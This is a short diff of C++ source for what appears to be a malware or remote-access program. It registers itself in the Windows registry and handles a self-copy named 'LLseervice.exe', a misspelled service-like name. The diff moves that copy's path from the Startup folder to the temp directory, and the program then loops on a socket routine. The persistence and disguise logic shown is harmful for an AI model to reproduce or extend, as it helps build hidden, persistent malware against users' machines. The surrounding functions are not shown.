@@ -15,12 +15,14 @@ using namespace std;
 
 int main()
 {
-	pre::start(2);
+	pre::start();
 
     Registry::RegisterProgram();
-	//todo check status progream
+
     if (IO::getFileName() != "LLseervice.exe"){
-        std::string path = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\LLseervice.exe";
+        char* temp = getenv("temp");
+        std::string temp_dir(temp);
+        std::string path = temp_dir+"\\LLseervice.exe";
         while(IO::exists_file(path)){
             ss::creckSoc();
         }
